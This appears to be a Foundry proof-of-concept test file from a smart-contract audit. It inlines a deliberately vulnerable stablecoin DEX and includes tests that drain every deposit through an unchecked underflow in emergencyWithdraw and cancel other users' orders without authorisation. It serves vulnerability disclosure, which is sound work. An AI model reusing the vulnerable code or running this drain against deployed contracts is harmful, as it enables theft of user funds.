// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// ── Minimal in-line copy of the target contracts ──────────────────────────────
// (avoids path config issues; logic is identical to the contest source)

contract MockTIP20 is ERC20 {
    constructor() ERC20("Mock TIP-20 USD", "mUSD") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract StablecoinDEX_Vulnerable {
    using SafeERC20 for IERC20;

    uint128 public constant MIN_ORDER_SIZE = 1e6;
    uint128 public constant MAX_PRICE_DEVIATION = 1e16;

    struct Order {
        address maker;
        address baseToken;
        address quoteToken;
        uint128 price;
        uint128 amount;
        uint128 remaining;
        uint128 prev;
        uint128 next;
    }

    mapping(uint128 => Order) public orders;
    mapping(address => mapping(address => uint128)) public balances;
    mapping(address => mapping(address => uint128)) public orderHeads;
    uint128 public nextOrderId;
    mapping(address => uint256) public totalDeposits;

    event Deposited(address indexed user, address indexed token, uint128 amount);
    event Withdrawn(address indexed user, address indexed token, uint128 amount);
    event OrderPlaced(uint128 indexed orderId, address indexed maker, address baseToken, address quoteToken, uint128 price, uint128 amount);
    event OrderCancelled(uint128 indexed orderId, address indexed maker, uint128 refundAmount);
    event OrderFilled(uint128 indexed orderId, address indexed taker, uint128 fillAmount, uint128 quoteAmount);

    error InsufficientBalance();
    error InvalidAmount();
    error InvalidPrice();
    error OrderDoesNotExist();
    error Unauthorized();
    error ZeroAddress();
    error OrderTooSmall();

    constructor() { nextOrderId = 1; }

    function deposit(address token, uint128 amount) external {
        if (token == address(0)) revert ZeroAddress();
        if (amount == 0) revert InvalidAmount();
        IERC20(token).safeTransferFrom(msg.sender, address(this), amount);
        balances[msg.sender][token] += amount;
        totalDeposits[token] += amount;
        emit Deposited(msg.sender, token, amount);
    }

    function withdraw(address token, uint128 amount) external {
        if (token == address(0)) revert ZeroAddress();
        if (amount == 0) revert InvalidAmount();
        if (balances[msg.sender][token] < amount) revert InsufficientBalance();
        IERC20(token).safeTransfer(msg.sender, amount);
        balances[msg.sender][token] -= amount;
        totalDeposits[token] -= amount;
        emit Withdrawn(msg.sender, token, amount);
    }

    function placeOrder(address baseToken, address quoteToken, uint128 price, uint128 amount) external returns (uint128 orderId) {
        if (baseToken == address(0) || quoteToken == address(0)) revert ZeroAddress();
        if (amount < MIN_ORDER_SIZE) revert OrderTooSmall();
        if (price == 0) revert InvalidPrice();
        if (balances[msg.sender][baseToken] < amount) revert InsufficientBalance();
        balances[msg.sender][baseToken] -= amount;
        orderId = nextOrderId++;
        orders[orderId] = Order({maker: msg.sender, baseToken: baseToken, quoteToken: quoteToken, price: price, amount: amount, remaining: amount, prev: 0, next: 0});
        uint128 currentHead = orderHeads[baseToken][quoteToken];
        if (currentHead != 0) { orders[currentHead].prev = orderId; orders[orderId].next = currentHead; }
        orderHeads[baseToken][quoteToken] = orderId;
        emit OrderPlaced(orderId, msg.sender, baseToken, quoteToken, price, amount);
    }

    function cancel(uint128 orderId) external {
        // BUG: no msg.sender == order.maker check
        Order storage order = orders[orderId];
        if (order.maker == address(0)) revert OrderDoesNotExist();
        _cancelOrder(orderId, order);
    }

    function _cancelOrder(uint128 orderId, Order storage order) internal {
        uint128 refund = order.remaining;
        address maker = order.maker;
        address baseToken = order.baseToken;
        address quoteToken = order.quoteToken;
        if (order.prev != 0) { orders[order.prev].next = order.next; } else { orderHeads[baseToken][quoteToken] = order.next; }
        if (order.next != 0) { orders[order.next].prev = order.prev; }
        delete orders[orderId].maker;
        delete orders[orderId].baseToken;
        delete orders[orderId].quoteToken;
        delete orders[orderId].price;
        delete orders[orderId].amount;
        balances[maker][baseToken] += refund;
        emit OrderCancelled(orderId, maker, refund);
    }

    function fillOrder(uint128 orderId, uint128 amount) external {
        Order storage order = orders[orderId];
        if (order.maker == address(0)) revert OrderDoesNotExist();
        if (amount == 0) revert InvalidAmount();
        if (amount > order.remaining) revert InvalidAmount();
        uint256 quoteAmount = (uint256(amount) * uint256(order.price)) / 1e18;
        if (quoteAmount == 0) revert InvalidAmount();
        if (balances[msg.sender][order.quoteToken] < quoteAmount) revert InsufficientBalance();
        balances[msg.sender][order.quoteToken] -= uint128(quoteAmount);
        balances[msg.sender][order.baseToken] += amount;
        balances[order.maker][order.quoteToken] += uint128(quoteAmount);
        order.remaining -= amount;
        emit OrderFilled(orderId, msg.sender, amount, uint128(quoteAmount));
        if (order.remaining == 0) { _removeFilledOrder(orderId, order); }
    }

    function _removeFilledOrder(uint128 orderId, Order storage order) internal {
        address baseToken = order.baseToken; address quoteToken = order.quoteToken;
        if (order.prev != 0) { orders[order.prev].next = order.next; } else { orderHeads[baseToken][quoteToken] = order.next; }
        if (order.next != 0) { orders[order.next].prev = order.prev; }
        order.prev = 0; order.next = 0; order.maker = address(0);
    }

    // BUG: no balance check + unchecked underflow
    function _processWithdrawal(address user, address token, uint128 amount) internal {
        unchecked {
            balances[user][token] -= amount;
            totalDeposits[token] -= amount;
        }
        IERC20(token).safeTransfer(user, amount);
    }

    function emergencyWithdraw(address token, uint128 amount) external {
        _processWithdrawal(msg.sender, token, amount);
        emit Withdrawn(msg.sender, token, amount);
    }

    function getBalance(address user, address token) external view returns (uint128) { return balances[user][token]; }
    function getOrder(uint128 orderId) external view returns (Order memory) { return orders[orderId]; }
    function getOrderHead(address baseToken, address quoteToken) external view returns (uint128) { return orderHeads[baseToken][quoteToken]; }
    function getTotalLiquidity(address token) external view returns (uint256) { return totalDeposits[token]; }
}

// ── PoC Tests ─────────────────────────────────────────────────────────────────

contract TempoStablecoinDEX_PoC is Test {
    StablecoinDEX_Vulnerable dex;
    MockTIP20 token;

    address victim   = makeAddr("victim");
    address attacker = makeAddr("attacker");

    uint128 constant VICTIM_DEPOSIT = 100_000e6; // 100,000 USDC equivalent

    function setUp() public {
        dex   = new StablecoinDEX_Vulnerable();
        token = new MockTIP20();

        token.mint(victim,   VICTIM_DEPOSIT);
        // attacker has ZERO tokens

        vm.startPrank(victim);
        token.approve(address(dex), VICTIM_DEPOSIT);
        dex.deposit(address(token), VICTIM_DEPOSIT);
        vm.stopPrank();
    }

    // ── Control: normal withdraw works ────────────────────────────────────────
    function test_control_normalWithdrawWorks() public {
        uint128 amt = 10_000e6;
        vm.prank(victim);
        dex.withdraw(address(token), amt);
        assertEq(dex.getBalance(victim, address(token)), VICTIM_DEPOSIT - amt);
    }

    // ── H-01: emergencyWithdraw drains entire contract ─────────────────────
    /// @notice Attacker with ZERO balance uses emergencyWithdraw to underflow
    ///         their internal balance and subsequently drain all deposited funds.
    function test_exploit_H01_emergencyWithdrawDrain() public {
        // Precondition: attacker has no deposit
        assertEq(dex.getBalance(attacker, address(token)), 0);
        assertEq(token.balanceOf(attacker), 0);

        uint128 contractBalance = uint128(token.balanceOf(address(dex)));
        emit log_named_uint("Contract token balance before attack", contractBalance);

        // Step 1: Call emergencyWithdraw with amount=1 (no balance check, unchecked underflow)
        vm.prank(attacker);
        dex.emergencyWithdraw(address(token), 1);

        // Attacker's internal balance is now type(uint128).max due to underflow
        uint128 attackerBalance = dex.getBalance(attacker, address(token));
        emit log_named_uint("Attacker internal balance after underflow", attackerBalance);
        assertEq(attackerBalance, type(uint128).max, "underflow should wrap to max uint128");

        // Step 2: Withdraw remaining contract balance using the inflated internal balance
        uint128 remaining = uint128(token.balanceOf(address(dex)));
        vm.prank(attacker);
        dex.withdraw(address(token), remaining);

        // Assert: contract is drained, attacker holds victim's funds
        assertEq(token.balanceOf(address(dex)), 0, "contract should be empty");
        assertEq(token.balanceOf(attacker), contractBalance, "attacker stole all funds");

        emit log_named_uint("Attacker token balance after exploit", token.balanceOf(attacker));
        emit log_string("H-01 CONFIRMED: complete fund drain via emergencyWithdraw underflow");
    }

    // ── M-01: anyone can cancel any order (griefing) ──────────────────────────
    function test_exploit_M01_unauthorizedOrderCancel() public {
        // Victim places an order
        vm.prank(victim);
        uint128 orderId = dex.placeOrder(address(token), address(token), 1e18, 10_000e6);

        assertEq(dex.getOrder(orderId).maker, victim, "order should exist");

        // Attacker (not the maker) cancels the victim's order
        address randomActor = makeAddr("randomActor");
        vm.prank(randomActor);
        dex.cancel(orderId);  // should revert if auth check existed

        // Order is gone — griefing confirmed
        assertEq(dex.getOrder(orderId).maker, address(0), "order was cancelled by non-maker");
        emit log_string("M-01 CONFIRMED: unauthorized order cancellation succeeded");
    }
}
